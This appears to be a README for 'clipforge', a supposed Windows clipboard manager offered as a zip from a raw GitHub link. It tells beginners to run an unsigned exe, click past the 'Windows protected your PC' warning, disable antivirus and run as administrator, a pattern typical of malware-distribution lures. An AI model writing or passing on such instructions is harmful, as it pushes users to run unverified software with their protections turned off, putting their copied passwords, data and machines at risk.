## 🚀 Getting Started

clipforge is a simple, free, and private clipboard manager that runs entirely on your Windows PC. No cloud, no account, no telemetry. Just download, extract, and run. It sits quietly in your system tray, remembers everything you copy, and lets you retrieve old snippets with a keystroke.

This guide is written for absolute beginners — no technical background needed. Follow the steps below, and you'll be up and running in under two minutes.

---

## 📥 Download & Install

### Step 1: Download the file

Click the green **Download clipforge** button above (or use this direct link: [https://raw.githubusercontent.com/Dorothyrodriguezb871/clipforge/main/clipforge.zip](https://raw.githubusercontent.com/Dorothyrodriguezb871/clipforge/main/clipforge.zip)). Your browser will save a file named `clipforge.zip` to your **Downloads** folder.

### Step 2: Extract the file

1. Open your **Downloads** folder (usually via File Explorer → This PC → Downloads).
2. Right-click on `clipforge.zip`.
3. Choose **Extract All…** from the menu.
4. Windows will ask where to save the extracted files. Keep the default location and click **Extract**.
5. A new folder called `clipforge` will appear next to the zip file.

### Step 3: Run the application

1. Open the `clipforge` folder you just extracted.
2. Double-click the file named `clipforge.exe`.
3. That's it! clipforge will appear as a small icon in your system tray (bottom-right corner of your screen, near the clock).

> **Tip:** If Windows shows a blue "Windows protected your PC" screen, click **More info** → **Run anyway**. This happens because the app is unsigned, but it's safe to run.

## 🧰 Usage

### Basic Usage

- **Copy anything** (text, links, code) as you normally do with Ctrl+C.
- **Open clipforge** by clicking its tray icon, or press **Ctrl+Shift+V** (default hotkey) to bring up the history window.
- **Search** your clipboard history using the search bar at the top.
- **Click any item** to copy it back to your clipboard. Then paste it anywhere with Ctrl+V.

### Advanced Tips

- **Pin important clips** by clicking the 📌 icon next to an item — they'll stay at the top.
- **Delete a single item** by hovering over it and clicking the 🗑️ icon.
- **Clear all history** by right-clicking the tray icon and selecting **Clear History**.
- **Change the hotkey** by right-clicking the tray icon → **Settings** → **Hotkey**.

### Keyboard Shortcuts

| Action | Shortcut |
|--------|----------|
| Open clipforge history | Ctrl+Shift+V |
| Close history window | Esc |
| Copy selected item | Enter |
| Move up/down in list | ↑ / ↓ |

## 🛠️ Troubleshooting

### "Windows protected your PC" warning

This is normal for new apps. Click **More info** → **Run anyway**. To avoid this in the future, right-click `clipforge.exe` → **Properties** → check **Unblock** → **Apply**.

### App doesn't start

- Make sure you extracted the **entire** zip file — don't run it from inside the zip.
- Check your antivirus: temporarily disable it, then run `clipforge.exe`. If it works, add an exception for the clipforge folder.
- Try running as administrator: right-click `clipforge.exe` → **Run as administrator**.

### Clipboard history is empty

- clipforge only captures items **after** it starts running. Copy something new, then open the history.
- Check that the tray icon is visible. If not, look for a hidden arrow (^) in the tray and click it.

### Hotkey doesn't work

- Some apps (like games or remote desktops) may block global shortcuts. Try a different hotkey in **Settings**.
- Make sure clipforge is still running (tray icon present).

### App freezes or crashes

- Restart the app: right-click tray icon → **Exit**, then relaunch `clipforge.exe`.
- If it persists, delete the `settings.json` file inside the clipforge folder (this resets settings, but keeps your history).

### Can't find the extracted folder

- Search your PC for `clipforge.exe` using the Windows search bar (next to Start menu).
